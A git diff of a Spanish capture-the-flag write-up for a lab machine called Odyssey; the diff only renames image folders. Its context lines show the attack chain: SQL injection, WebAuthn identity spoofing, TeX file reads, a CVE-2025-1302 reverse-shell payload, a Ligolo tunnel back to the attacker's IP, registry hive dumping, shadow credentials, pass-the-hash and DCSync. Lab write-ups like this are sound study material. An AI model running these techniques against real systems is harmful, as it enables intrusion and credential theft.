@@ -40,13 +40,13 @@ flowchart TD
 
 Agregamos la máquina al archivo `/etc/hosts`:
 
-![Pasted image 20260817224953](../../Images/Odyssey/Pasted%20image%2020260817224953.png)
+![Pasted image 20260817224953](../../Images/MakeSense/Pasted%20image%2020260817224953.png)
 
 ### 2.2 Comprobar conectividad
 
 Comprobamos conectividad con `ping`:
 
-![Pasted image 20260817225159](../../Images/Odyssey/Pasted%20image%2020260817225159.png)
+![Pasted image 20260817225159](../../Images/MakeSense/Pasted%20image%2020260817225159.png)
 
 ### 2.3 Escaneo de puertos con Nmap
 
@@ -60,7 +60,7 @@ sudo nmap -Pn -sV -A -p3000 --min-rate 4000 10.129.76.62
 
 El escaneo revela una redirección hacia `aegis.korvia.htb:3000`, que agregamos a `/etc/hosts`.
 
-![Pasted image 20260817231217](../../Images/Odyssey/Pasted%20image%2020260817231217.png)
+![Pasted image 20260817231217](../../Images/MakeSense/Pasted%20image%2020260817231217.png)
 
 ---
 
@@ -70,7 +70,7 @@ El escaneo revela una redirección hacia `aegis.korvia.htb:3000`, que agregamos 
 
 Al acceder a la web, nos redirige a un formulario de login basado en **WebAuthn** (autenticación por hardware):
 
-![Pasted image 20260817231325](../../Images/Odyssey/Pasted%20image%2020260817231325.png)
+![Pasted image 20260817231325](../../Images/MakeSense/Pasted%20image%2020260817231325.png)
 
 Interceptando la solicitud POST con **BurpSuite**:
 
@@ -100,14 +100,14 @@ gobuster dir -u http://aegis.korvia.htb:3000/ /
 
 El endpoint `/onboard` devuelve un código **400**, lo que sugiere una funcionalidad de registro que requiere un token de invitación.
 
-![Pasted image 20260817235403](../../Images/Odyssey/Pasted%20image%2020260817235403.png)
+![Pasted image 20260817235403](../../Images/MakeSense/Pasted%20image%2020260817235403.png)
 
 ### 3.3 Descubrimiento de metadatos AAGUID
 
 Al examinar las solicitudes en BurpSuite, identificamos un endpoint que devuelve metadatos de autenticadores WebAuthn/FIDO y que realiza consultas a la base de datos:
 
-![Captura de pantalla 2026-08-18 000431](../../Images/Odyssey/Captura%20de%20pantalla%202026-08-18%20000431.png)
-![Pasted image 20260818000556](../../Images/Odyssey/Pasted%20image%2020260818000556.png)
+![Captura de pantalla 2026-08-18 000431](../../Images/MakeSense/Captura%20de%20pantalla%202026-08-18%20000431.png)
+![Pasted image 20260818000556](../../Images/MakeSense/Pasted%20image%2020260818000556.png)
 
 ---
 
@@ -145,7 +145,7 @@ curl -sG 'http://aegis.korvia.htb:3000/api/v1/aegis-mds/search' /
 }
 ```
 
-![Pasted image 20260818001909](../../Images/Odyssey/Pasted%20image%2020260818001909.png)
+![Pasted image 20260818001909](../../Images/MakeSense/Pasted%20image%2020260818001909.png)
 
 > [!success] Inyección exitosa
 > Se recuperaron tokens de operador no canjeados, permitiéndonos avanzar al registro.
@@ -158,7 +158,7 @@ curl -sG 'http://aegis.korvia.htb:3000/api/v1/aegis-mds/search' /
 
 Con un token válido, registramos un usuario a través del endpoint `/onboard`:
 
-![Pasted image 20260818003146](../../Images/Odyssey/Pasted%20image%2020260818003146.png)
+![Pasted image 20260818003146](../../Images/MakeSense/Pasted%20image%2020260818003146.png)
 
 ### 5.2 Creación del autenticador virtual
 
@@ -241,7 +241,7 @@ print("[+] credential saved to ./aegis_cred.pkl")
 
 </details>
 
-![Pasted image 20260818145622](../../Images/Odyssey/Pasted%20image%2020260818145622.png)
+![Pasted image 20260818145622](../../Images/MakeSense/Pasted%20image%2020260818145622.png)
 
 ### 5.3 Script de login WebAuthn
 
@@ -331,7 +331,7 @@ Si la aplicación asigna permisos basándose únicamente en el `userHandle` dura
 [+] auth/finish: 200 {"ok":true,"handle":"admin","display_name":"System Administrator","role":"Administrator","clearance":"Δ-5","redirect":"/dashboard"}
 ```
 
-![Pasted image 20260818153839](../../Images/Odyssey/Pasted%20image%2020260818153839.png)
+![Pasted image 20260818153839](../../Images/MakeSense/Pasted%20image%2020260818153839.png)
 
 > [!success] Escalada a Admin
 > Modificando el `userHandle` a `admin` en el script de login, obtenemos acceso como **System Administrator**.
@@ -348,8 +348,8 @@ Como admin, la sección **Notice Templates** permite renderizar plantillas. El s
 Nunjucks → Pandoc → pdflatex → PDF
 ```
 
-![Pasted image 20260818192515](../../Images/Odyssey/Pasted%20image%2020260818192515.png)
-![Pasted image 20260818192724](../../Images/Odyssey/Pasted%20image%2020260818192724.png)
+![Pasted image 20260818192515](../../Images/MakeSense/Pasted%20image%2020260818192515.png)
+![Pasted image 20260818192724](../../Images/MakeSense/Pasted%20image%2020260818192724.png)
 
 ### 6.2 File Read vía primitivas TeX
 
@@ -370,8 +370,8 @@ Utilizando primitivas TeX podemos leer archivos del servidor:
 | `/etc/systemd/system/aegis.service` | Raíz web: `/home/webadmin/aegis` |
 | `/home/webadmin/aegis/server.js` | Código fuente del backend |
 
-![Pasted image 20260818204107](../../Images/Odyssey/Pasted%20image%2020260818204107.png)
-![Pasted image 20260818204512](../../Images/Odyssey/Pasted%20image%2020260818204512.png)
+![Pasted image 20260818204107](../../Images/MakeSense/Pasted%20image%2020260818204107.png)
+![Pasted image 20260818204512](../../Images/MakeSense/Pasted%20image%2020260818204512.png)
 
 ---
 
@@ -394,7 +394,7 @@ const DEFAULT_JP_OPTS = { eval: 'safe', preventEval: false };
 MDS_DIAG_TOKEN=bcdf42b953dcee715b8d81e38f0c5ded
 ```
 
-![Pasted image 20260818210912](../../Images/Odyssey/Pasted%20image%2020260818210912.png)
+![Pasted image 20260818210912](../../Images/MakeSense/Pasted%20image%2020260818210912.png)
 
 ### 7.3 Explotación de CVE-2025-1302
 
@@ -415,7 +415,7 @@ expr = f"$..[?(p=/"{inner}/";Ethan=''[['constructor']][['constructor']](p);Ethan
 r = requests.post(URL, json={"context": "registration", "expr": expr}, timeout=5)
 ```
 
-![Pasted image 20260818211934](../../Images/Odyssey/Pasted%20image%2020260818211934.png)
+![Pasted image 20260818211934](../../Images/MakeSense/Pasted%20image%2020260818211934.png)
 
 > [!success] Shell como webadmin
 > Obtenemos reverse shell como el usuario `webadmin` en `odyssey-web`.
@@ -428,13 +428,13 @@ r = requests.post(URL, json={"context": "registration", "expr": expr}, timeout=5
 
 En `/home/webadmin/aegis/db/sql.js` encontramos credenciales de la base de datos:
 
-![Pasted image 20260818212226](../../Images/Odyssey/Pasted%20image%2020260818212226.png)
+![Pasted image 20260818212226](../../Images/MakeSense/Pasted%20image%2020260818212226.png)
 
 Contraseña: `opc0932k90%%lODFI93-++`
 
 El usuario `webadmin` pertenece al grupo `sudo`. Reutilizamos la contraseña:
 
-![Pasted image 20260818213242](../../Images/Odyssey/Pasted%20image%2020260818213242.png)
+![Pasted image 20260818213242](../../Images/MakeSense/Pasted%20image%2020260818213242.png)
 
 ### 8.2 Descubrimiento de red interna
 
@@ -449,7 +449,7 @@ root@odyssey-web:~# ifconfig
 | odyssey-db | 172.16.0.11 | Servidor MSSQL |
 | dc01 | 172.16.0.10 | Controlador de dominio |
 
-![Pasted image 20260818214251](../../Images/Odyssey/Pasted%20image%2020260818214251.png)
+![Pasted image 20260818214251](../../Images/MakeSense/Pasted%20image%2020260818214251.png)
 
 ### 8.3 Túnel con Ligolo-ng
 
@@ -463,7 +463,7 @@ ligolo-proxy -selfcert
 ./agent -connect 10.10.15.82:11601 -ignore-cert
 ```
 
-![Pasted image 20260819085331](../../Images/Odyssey/Pasted%20image%2020260819085331.png)
+![Pasted image 20260819085331](../../Images/MakeSense/Pasted%20image%2020260819085331.png)
 
 ### 8.4 Nmap sobre odyssey-db
 
@@ -517,7 +517,7 @@ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 impacket-mssqlclient 'svc-mssql:cml958782@172.16.0.11' -p 1433
 ```
 
-![Pasted image 20260819094104](../../Images/Odyssey/Pasted%20image%2020260819094104.png)
+![Pasted image 20260819094104](../../Images/MakeSense/Pasted%20image%2020260819094104.png)
 
 `svc-mssql` es **sysadmin** y tiene el privilegio `SeImpersonatePrivilege`.
 
@@ -565,13 +565,13 @@ reg save HKLM/SYSTEM C:/Users/Public/system.save
 reg save HKLM/SECURITY C:/Users/Public/security.save
 ```
 
-![Pasted image 20260819103938](../../Images/Odyssey/Pasted%20image%2020260819103938.png)
+![Pasted image 20260819103938](../../Images/MakeSense/Pasted%20image%2020260819103938.png)
 
 ### 11.3 Shadow Credentials → svc-aegis-build
 
 La cuenta de máquina `ODYSSEY-DB$` tiene el enlace `addKeyCredentialLink` sobre `svc-aegis-build`:
 
-![Pasted image 20260819104534](../../Images/Odyssey/Pasted%20image%2020260819104534.png)
+![Pasted image 20260819104534](../../Images/MakeSense/Pasted%20image%2020260819104534.png)
 
 ```bash
 certipy-ad shadow auto -u 'ODYSSEY-DB$@odyssey.htb' /
@@ -626,11 +626,11 @@ evil-winrm -i 172.16.0.10 -u svc-aegis-deploy -H '3a5026b2aa5ef2cbb7cb6a7be3a2bc
 reg query "HKLM/SYSTEM/CurrentControlSet/Services/AegisStreamCollector" /v ImagePath
 ```
 
-![Pasted image 20260820153830](../../Images/Odyssey/Pasted%20image%2020260820153830.png)
+![Pasted image 20260820153830](../../Images/MakeSense/Pasted%20image%2020260820153830.png)
 
 El usuario `svc-aegis-stream` tiene derechos de **DCSync** en BloodHound:
 
-![Pasted image 20260820154324](../../Images/Odyssey/Pasted%20image%2020260820154324.png)
+![Pasted image 20260820154324](../../Images/MakeSense/Pasted%20image%2020260820154324.png)
 
 ### 12.3 Análisis del Named Pipe AegisStreamMgmt
 
@@ -673,7 +673,7 @@ operator.key
 
 Script `oracle_decrypt.ps1` ejecutado via WinRM:
 
-![Pasted image 20260820170800](../../Images/Odyssey/Pasted%20image%2020260820170800.png)
+![Pasted image 20260820170800](../../Images/MakeSense/Pasted%20image%2020260820170800.png)
 
 Descifrado local de la clave del operador:
 
@@ -691,7 +691,7 @@ print(op_key.hex())
 
 **Clave del operador:** `4b690afb33fd7f1bd2c4b36fce121b8b291352a5a0ed8632a0654422f401a83c`
 
-![Pasted image 20260820171336](../../Images/Odyssey/Pasted%20image%2020260820171336.png)
+![Pasted image 20260820171336](../../Images/MakeSense/Pasted%20image%2020260820171336.png)
 
 ### 12.5 YAML Deserialization RCE via CONFIG_IMPORT
 
@@ -717,7 +717,7 @@ Mediante `CONFIG_IMPORT`, copiamos y ejecutamos **Rubeus** para obtener un TGT d
 # Status: OK | PayloadLen: 0
 ```
 
-![Pasted image 20260820172204](../../Images/Odyssey/Pasted%20image%2020260820172204.png)
+![Pasted image 20260820172204](../../Images/MakeSense/Pasted%20image%2020260820172204.png)
 
 Rubeus `tgtdeleg` produce un AP-REQ delegation ticket para `svc-aegis-stream`.
 
@@ -751,7 +751,7 @@ evil-winrm -i 172.16.0.10 -u Administrator -H "890b9e96245f6895e06adfe92ad1e81f"
 
 **Root flag:** `C:/Users/Administrator/Desktop/root.txt`
 
-![Pasted image 20260820174951](../../Images/Odyssey/Pasted%20image%2020260820174951.png)
+![Pasted image 20260820174951](../../Images/MakeSense/Pasted%20image%2020260820174951.png)
 
 > [!success] Flags obtenidas
 > **User Flag:** `00e897f9019b2fc5b07a401a6c25b971` ✅
